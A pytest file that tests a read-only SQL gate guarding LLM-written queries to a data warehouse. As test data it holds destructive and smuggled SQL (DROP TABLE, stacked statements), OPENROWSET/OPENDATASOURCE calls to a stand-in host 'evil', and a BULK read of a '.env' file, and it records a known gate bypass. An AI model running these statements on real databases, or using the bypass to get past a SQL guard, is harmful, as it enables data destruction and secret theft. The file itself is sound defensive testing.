"""Scenario matrix for the read-only SQL gate.

is_read_only_sql is the only thing between LLM-authored SQL and a live
warehouse (fabric/warehouse_schema.py, fabric/warehouse_profile.py,
model/project_sources.py). A single test down the middle -- "SELECT is allowed,
DROP is not" -- proves almost nothing about a gate whose whole job is the
adversarial tail, so this walks the space: statement kinds, comment and string
obfuscation, stacked statements, quoted identifiers that collide with
keywords, and the remote-data-source functions.
"""

from __future__ import annotations

import pytest

from util.sql_safety import (
    _HAS_SQLGLOT,
    _is_read_only_regex,
    _is_read_only_sqlglot,
    is_read_only_sql,
)

# --- Reads that must survive the gate ---------------------------------------
# A gate that blocks legitimate profiling SQL is a broken gate: the caller
# reports "refused non-read-only probe" and the model build loses its schema.

MUST_ALLOW = [
    ("bare select", "SELECT 1"),
    ("lowercase", "select top 10 * from dbo.t"),
    ("cte", "WITH c AS (SELECT 1 AS x) SELECT * FROM c"),
    ("nested cte", "WITH a AS (SELECT 1 x), b AS (SELECT x FROM a) SELECT * FROM b"),
    ("order/offset", "SELECT * FROM t ORDER BY 1 OFFSET 0 ROWS FETCH NEXT 5 ROWS ONLY"),
    ("union", "SELECT 1 UNION SELECT 2"),
    ("union all", "SELECT 1 UNION ALL SELECT 2"),
    ("parenthesised", "(SELECT 1)"),
    ("trailing semicolon", "SELECT * FROM t;"),
    ("leading newlines", "\n\nSELECT\n1\n"),
    ("line comment tail", "SELECT 1 -- ; DROP TABLE t"),
    ("block comment", "SELECT 1 /* comment */ FROM t"),
    ("comment as whitespace", "SELECT/**/1"),
    ("escaped quote", "SELECT * FROM t WHERE a = 'it''s'"),
    ("system catalog", "SELECT * FROM sys.tables"),
    ("aggregate", "SELECT COUNT(*), COUNT(c) FROM dbo.factpolicy"),
    ("join", "SELECT a.x FROM t a JOIN u b ON a.k = b.k"),
    ("subquery", "SELECT * FROM (SELECT 1 AS x) z"),
    ("case expression", "SELECT CASE WHEN 1=1 THEN 'x' END"),
    ("for json", "SELECT * FROM t FOR JSON AUTO"),
]


@pytest.mark.parametrize(
    "sql", [c[1] for c in MUST_ALLOW], ids=[c[0] for c in MUST_ALLOW]
)
def test_legitimate_reads_are_allowed(sql):
    ok, why = is_read_only_sql(sql)
    assert ok, f"read query wrongly refused: {why}"


# --- Writes and DDL that must not survive -----------------------------------

MUST_BLOCK = [
    ("insert", "INSERT INTO t VALUES (1)"),
    ("update", "UPDATE t SET a=1"),
    ("delete", "delete from t"),
    ("merge", "MERGE t USING s ON 1=1 WHEN MATCHED THEN DELETE"),
    ("truncate", "TRUNCATE TABLE t"),
    ("drop", "DROP TABLE t"),
    ("create", "CREATE TABLE t (a int)"),
    ("alter", "ALTER TABLE t ADD b int"),
    ("grant", "GRANT SELECT ON t TO u"),
    ("use", "USE master"),
    ("exec proc", "EXEC sp_who"),
    ("exec dynamic sql", "EXECUTE ('DROP TABLE t')"),
    ("select into", "SELECT * INTO newt FROM t"),
    ("backup", "BACKUP DATABASE d TO DISK='x'"),
    ("shutdown", "SHUTDOWN"),
    ("waitfor", "WAITFOR DELAY '00:00:05'"),
]


@pytest.mark.parametrize(
    "sql", [c[1] for c in MUST_BLOCK], ids=[c[0] for c in MUST_BLOCK]
)
def test_writes_and_ddl_are_blocked(sql):
    ok, why = is_read_only_sql(sql)
    assert not ok, "non-read-only statement was allowed"
    assert why, "a refusal must explain itself -- the reason is surfaced to the model"


# --- Stacked statements: the classic way a read smuggles a write ------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM t; SELECT * FROM u",
        "SELECT * FROM t; DROP TABLE u",
        "SELECT 1;DELETE FROM t",
        "DECLARE @x int; SELECT @x",
    ],
)
def test_statement_batches_are_refused(sql):
    ok, why = is_read_only_sql(sql)
    assert not ok
    assert "multiple statements" in why or "read-only" in why


# --- Obfuscation: keywords that only LOOK dangerous, and vice versa ---------


def test_keyword_inside_string_literal_is_not_a_write():
    """'DROP TABLE t' as data must not be mistaken for a statement."""
    ok, _ = is_read_only_sql("SELECT 'DROP TABLE t' AS s")
    assert ok


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT [delete] FROM t",
        'SELECT "drop" FROM t',
    ],
    ids=["bracketed identifier", "ansi-quoted identifier"],
)
def test_quoted_identifiers_named_after_keywords_are_allowed(sql):
    ok, why = is_read_only_sql(sql)
    assert ok, why


def test_keyword_split_by_comment_does_not_parse_as_a_read():
    """SEL/**/ECT is not a real bypass -- but it must not be waved through."""
    ok, _ = is_read_only_sql("SEL/**/ECT 1")
    assert not ok


def test_unterminated_block_comment_is_refused_not_crashed():
    ok, why = is_read_only_sql("SELECT * FROM t /* unterminated")
    assert not ok and why


# --- Degenerate input -------------------------------------------------------


@pytest.mark.parametrize("sql", ["", "   ", "\n\t ", ";"])
def test_empty_input_is_refused(sql):
    ok, why = is_read_only_sql(sql)
    assert not ok and why


# --- Remote data sources ----------------------------------------------------
# OPENROWSET/OPENQUERY/OPENDATASOURCE reach OUTSIDE the connected warehouse --
# a linked server, an arbitrary connection string, or (with BULK) a file on the
# host. They are read-shaped, so a node-type check waves them through, and they
# are in _FORBIDDEN_KEYWORDS precisely because the author judged them unsafe.

REMOTE_SOURCE_SQL = [
    (
        "openrowset",
        ("SELECT * FROM OPENROWSET('SQLNCLI','Server=evil;Trusted_Connection=yes;',"
        "'SELECT * FROM sys.databases')"),
    ),
    ("openquery", "SELECT * FROM OPENQUERY(linked, 'SELECT 1')"),
    (
        "opendatasource",
        "SELECT * FROM OPENDATASOURCE('SQLNCLI','Data Source=evil').db.dbo.t",
    ),
]


@pytest.mark.parametrize(
    "sql", [c[1] for c in REMOTE_SOURCE_SQL], ids=[c[0] for c in REMOTE_SOURCE_SQL]
)
def test_regex_backend_blocks_remote_data_sources(sql):
    """The keyword backend enforces the intent. This is the contract."""
    ok, why = _is_read_only_regex(sql)
    assert not ok
    assert "forbidden keyword" in why


@pytest.mark.xfail(
    strict=True,
    reason=(
        "BUG: _is_read_only_sqlglot never consults _FORBIDDEN_KEYWORDS, so "
        "OPENROWSET/OPENQUERY/OPENDATASOURCE parse as ordinary reads and pass. "
        "sqlglot is a hard requirement (requirements.txt), so is_read_only_sql "
        "always takes this branch and the keyword list is dead code in every "
        "real deployment. Delete this marker when the backends agree."
    ),
)
@pytest.mark.parametrize(
    "sql", [c[1] for c in REMOTE_SOURCE_SQL], ids=[c[0] for c in REMOTE_SOURCE_SQL]
)
def test_active_backend_blocks_remote_data_sources(sql):
    ok, _ = is_read_only_sql(sql)
    assert not ok, "remote-data-source function reached the warehouse"


def test_openrowset_bulk_file_read_is_blocked_by_parse_failure():
    """Blocked today, but only because sqlglot cannot parse BULK -- an accident
    of the parser, not the gate. Pinned so a parser upgrade that starts
    accepting BULK shows up here as a failure."""
    ok, why = is_read_only_sql(
        r"SELECT a FROM OPENROWSET(BULK 'C:\Users\x\.env', SINGLE_CLOB) AS z(a)"
    )
    assert not ok
    assert "unparseable" in why


# --- Backend selection ------------------------------------------------------


def test_sqlglot_backend_is_the_one_actually_running():
    """If this flips, every _is_read_only_sqlglot finding above is moot and the
    stricter regex path takes over."""
    assert _HAS_SQLGLOT, "sqlglot missing: the gate silently swaps implementations"


@pytest.mark.parametrize(
    "sql", [c[1] for c in MUST_BLOCK], ids=[c[0] for c in MUST_BLOCK]
)
def test_both_backends_agree_on_writes_and_ddl(sql):
    """Divergence between the two implementations is the failure mode that
    produced the OPENROWSET hole. Writes/DDL must be refused by both."""
    assert not _is_read_only_regex(sql)[0]
    assert not _is_read_only_sqlglot(sql)[0]
